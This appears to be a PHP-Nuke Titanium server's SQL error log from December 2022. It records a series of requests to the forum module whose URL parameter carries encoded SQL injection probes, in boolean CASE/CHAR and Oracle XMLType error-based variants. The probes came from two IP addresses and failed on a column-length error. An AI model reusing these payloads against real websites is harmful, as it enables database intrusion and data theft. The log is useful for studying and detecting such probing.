+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%29%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%285522%3D5522&p=91">/modules.php?name=Forums&file=viewtopic%29%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%285522%3D5522&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654237', 
+			'1670654237', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%29%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%285522%3D5522&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:23] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&p=91">/modules.php?name=Forums&file=viewtopic%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654243', 
+			'1670654243', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:26] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20cORb&p=91">/modules.php?name=Forums&file=viewtopic%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20cORb&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654246', 
+			'1670654246', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20cORb&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:30] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%27%29%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27pCVs%27%3D%27pCVs&p=91">/modules.php?name=Forums&file=viewtopic%27%29%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27pCVs%27%3D%27pCVs&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654250', 
+			'1670654250', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%27%29%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27pCVs%27%3D%27pCVs&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:35] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%27%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27eblv%27%3D%27eblv&p=91">/modules.php?name=Forums&file=viewtopic%27%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27eblv%27%3D%27eblv&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654255', 
+			'1670654255', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%27%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27eblv%27%3D%27eblv&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:39] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%29%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%289919%3D9919&p=91">/modules.php?name=Forums&file=viewtopic%29%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%289919%3D9919&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654259', 
+			'1670654259', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%29%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%289919%3D9919&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:41] - 
+User: 
+IP: 185.220.100.240
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&p=91">/modules.php?name=Forums&file=viewtopic%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654261', 
+			'1670654261', 
+			'185.220.100.240', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:43] - 
+User: 
+IP: 185.220.100.240
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Tdgt&p=91">/modules.php?name=Forums&file=viewtopic%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Tdgt&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654263', 
+			'1670654263', 
+			'185.220.100.240', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%20AND%206027%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286027%3D6027%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Tdgt&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
